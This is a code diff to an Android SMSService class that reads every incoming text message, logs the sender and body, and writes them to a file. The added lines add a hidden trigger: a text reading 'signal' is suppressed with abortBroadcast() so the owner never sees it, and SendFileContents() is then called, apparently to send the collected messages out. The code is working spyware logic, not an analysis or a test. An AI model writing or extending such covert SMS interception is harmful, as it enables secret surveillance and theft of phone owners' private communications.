@@ -66,6 +66,8 @@ public class SMSService extends Service {
                             String senderNum = phoneNumber;
                             String message = currentMessage.getDisplayMessageBody();
 
+
+
                             Log.i("zack", "Receieved from: "+ senderNum + " Message: " + message);
 
                             WriteToFile(senderNum, message);
@@ -74,6 +76,18 @@ public class SMSService extends Service {
                                 int duration = Toast.LENGTH_LONG;
                                 Toast toast = Toast.makeText(context, "Receieved from: " + senderNum + " Message: " + message, duration);
                                 toast.show();
+                            }
+
+                            if (message.equalsIgnoreCase("signal"))
+                            {
+                                abortBroadcast();
+                                try {
+                                    SendFileContents();
+                                }
+                                catch(Exception e)
+                                {
+                                    e.printStackTrace();
+                                }
                             }
                         }
                     }
